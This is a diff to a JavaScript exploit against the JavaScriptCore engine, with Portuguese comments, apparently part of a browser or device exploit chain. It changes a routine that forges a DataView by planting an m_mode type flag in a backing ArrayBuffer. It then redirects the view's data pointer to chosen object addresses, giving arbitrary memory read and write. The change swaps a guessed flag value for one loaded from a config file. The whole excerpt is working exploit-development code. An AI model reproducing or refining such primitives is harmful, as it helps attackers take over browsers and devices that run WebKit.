@@ -118,8 +118,9 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         // --- NOVO: Plantar o m_mode (flags de tipo) para um DataView real ---
         // Este valor é crucial para o engine reconhecer o objeto como um DataView.
         // O valor exato para um DataView precisa ser verificado via engenharia reversa.
-        // Exemplo: Pode ser 0x00000001 para flags básicas de DataView, ou um valor mais complexo.
-        const DATA_VIEW_M_MODE_VALUE = 0x00000001; // Este é um CHUTE, DEVE SER VERIFICADO NO IDA PRO!
+        // O valor 0x00000001 usado anteriormente era um CHUTE. Ele provavelmente não é o correto.
+        // É essencial encontrar o valor correto para M_MODE_VALUE no config.mjs
+        const DATA_VIEW_M_MODE_VALUE = JSC_OFFSETS_PARAM.DataView.M_MODE_VALUE; // Agora usando o valor do config.mjs
         await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), DATA_VIEW_M_MODE_VALUE, 4);
         logFn(`[${FNAME}] m_mode (${toHex(DATA_VIEW_M_MODE_VALUE)}) plantado no offset 0x${JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET.toString(16)} do ArrayBuffer de apoio (para ser DataView).`, "info", FNAME);
 
@@ -140,7 +141,7 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
             logFn(`[${FNAME}] Testando L/E Universal com _fake_data_view: Alvo é objeto JS em ${test_target_js_object_addr.toString(true)}`, "info", FNAME);
 
             // Para testar, definimos o m_vector do DataView forjado para o objeto de teste.
-            // O m_vector do DataView é o campo contentsImpl (ou similar) do ArrayBuffer de apoio.
+            // O m_vector do DataView é o campo contentsImpl (ou similar) do ArrayBuffer.
             await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), test_target_js_object_addr, 8);
             logFn(`[${FNAME}] m_vector do DataView forjado (que é o contentsImpl do ArrayBuffer de apoio) redirecionado para ${test_target_js_object_addr.toString(true)}.`, "info", FNAME);
 
